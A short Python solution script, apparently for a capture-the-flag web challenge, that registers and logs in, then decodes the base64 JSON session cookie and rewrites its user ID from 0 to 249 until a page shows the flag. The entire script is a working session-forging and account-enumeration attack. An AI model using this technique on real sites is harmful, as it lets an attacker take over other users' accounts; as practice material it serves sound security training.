#!/usr/bin/env python3

import requests
import base64
import json
from urllib.parse import unquote,quote

class Inj:
    def __init__(self,host):
        self.sess = requests.Session()
        self.base_url = '{}/'.format(host)

    def _do_raw_req(self,url,query):
        data = {'query': query}
        return self.sess.post(url,json=data).json()
    
    def register(self,payload):
        url = self.base_url + 'register.php'
        return self.sess.post(url,data=payload)
    
    def login(self,payload):
        url = self.base_url + 'index.php'
        return self.sess.post(url,data=payload, allow_redirects=False)
    
    def navigate(self,cookie,new_cookie):
        url = self.base_url + 'home.php'
        self.sess.cookies.set(cookie,new_cookie)
        return self.sess.get(url)

        

def main():
    inj = Inj('http://sn4ck-sh3nan1gans.challs.olicyber.it')
    payload = {'username':'petona','password':'puzzolente','register':''}
    inj.register(payload)

    payload2 = {'username':'petona','password':'puzzolente','login':''}
    r = inj.login(payload2)
    cookie_dict = inj.sess.cookies.get_dict()
    cookie = cookie_dict['login']

    #convert & tamper the session cookie
    token = json.loads(base64.b64decode(unquote(cookie)).decode('utf-8'))
    print(f"Original token: {token}")

    for i in range(0,250):
        token['ID'] = i
        print(token)
        new_cookie =  quote(base64.b64encode(json.dumps(token).encode('utf-8')).decode('utf-8'))
        print(f"Modified cookie: {new_cookie}")
        resp = inj.navigate('login', new_cookie)
        if "flag{" in resp.text:
            print("Found!")
            print(resp.text)
            break




if __name__ == "__main__":
    main()

